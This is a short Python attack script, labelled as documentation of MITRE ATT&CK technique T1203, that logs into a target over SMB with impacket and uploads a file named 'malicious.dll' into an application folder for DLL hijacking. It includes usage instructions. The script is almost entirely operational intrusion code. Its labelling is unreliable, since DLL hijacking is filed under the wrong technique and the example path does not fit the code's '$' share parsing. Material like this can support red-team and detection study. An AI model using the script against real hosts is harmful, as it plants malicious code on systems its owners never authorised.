# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1203 - Exploitation for Client Execution
# Objective: Exploit a vulnerability. This script demonstrates a common technique: 
# planting a malicious DLL in a path where a vulnerable application will load it instead of the legitimate one (DLL Hijacking).
# The script uploads the malicious.dll to a writable application directory.

#!/usr/bin/env python3
import sys
from impacket.smbconnection import SMBConnection

def upload_dll(target, username, password, domain, dll_path, remote_path):
    """
    Uploads a malicious DLL to a target path for a DLL hijacking scenario.
    """
    try:
        print(f"[*] Attempting to upload {dll_path} to {target}...")
        smb_conn = SMBConnection(remoteName=target, remoteHost=target)
        smb_conn.login(username, password, domain)

        # Example: C:\Program Files\VulnerableApp\
        share, path = remote_path.split('$', 1)[0], remote_path.split('$', 1)[1]
        share += "$"
        
        print(f"[*] Uploading to share: {share}, path: {path}")
        
        with open(dll_path, 'rb') as f:
            smb_conn.putFile(share, path + "\\malicious.dll", f.read)
        
        print(f"[+] Successfully uploaded malicious DLL to {remote_path}")
        print("[+] When the vulnerable application starts, it will load the malicious DLL.")
        smb_conn.logoff()
    except Exception as e:
        print(f"[-] Error uploading DLL: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print("Usage: ./T1203_dll_hijack.py <target> <username> <password> <domain> <remote_path>")
        print("Example: ./T1203_dll_hijack.py 192.168.1.100 user pass CORP 'C:\\Program Files\\VulnerableApp'")
        print("Note: You must create 'malicious.dll' first.")
        sys.exit(1)
    
    # Assumes 'malicious.dll' is in the same directory
    upload_dll(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], "malicious.dll", sys.argv[5])